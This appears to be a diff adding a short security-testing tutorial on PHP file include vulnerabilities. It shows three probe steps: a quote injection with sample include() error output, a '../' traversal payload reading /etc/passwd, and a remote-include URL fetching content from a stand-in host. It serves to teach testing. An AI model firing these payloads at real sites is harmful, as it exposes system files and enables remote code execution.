@@ -1,0 +1,21 @@
+File include vulnerabilities come from a lack of filtering when a user-controlled parameter is used as part of a file name in a call to an including function (require, require_once, include or include_once in PHP for example). If the call to one of these methods is vulnerable, an attacker will be able to manipulate the function to load his own code. File include vulnerabilities can also be used as a directory traversal to read arbitrary files. However, if the arbitrary code contains an opening PHP tag, the file will be interpreted as PHP code.
+By default, PHP disables loading of remote files, thanks to the configuration option: allow_url_include.
+
+1. You can see an error message, as soon as you inject a special character (a quote, for example) into the parameter:
+
+- http://test.com/?page=[special character]
+
+Output should be:
+
+Warning: include('): failed to open stream: No such file or directory in /var/www/index.php on line 13
+Warning: include(): Failed opening ''' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/index.php on line 13
+
+The function used is include().
+
+2. We can use the methods used to detect directory traversal, to detect file include. For example, you can try to include /etc/passwd by using the ../ technique.
+
+- http://test.com/?page=/../../../etc/passwd
+
+3. We can test for Remote File Include, by requesting an external resource: https://xxx.com/. We will see that it gets included inside the current page:
+
+- http://test.com/?page=http://xxx.com
